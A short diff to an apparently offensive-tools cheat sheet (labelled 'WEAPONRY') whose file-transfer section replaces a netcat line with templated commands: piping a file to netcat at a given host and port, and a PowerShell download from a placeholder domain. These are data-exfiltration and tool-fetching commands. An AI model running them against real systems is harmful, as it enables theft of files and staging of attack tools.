@@ -6,4 +6,12 @@ category: WEAPONRY
 
 # 文件传输
 
-cat xxx|nc x.x.x.x 4444
+#### NC
+``` bash
+cat ${file}|nc ip port
+```
+
+#### Powershell
+``` bash
+wget -Uri http://domain/file -OutFile file
+```
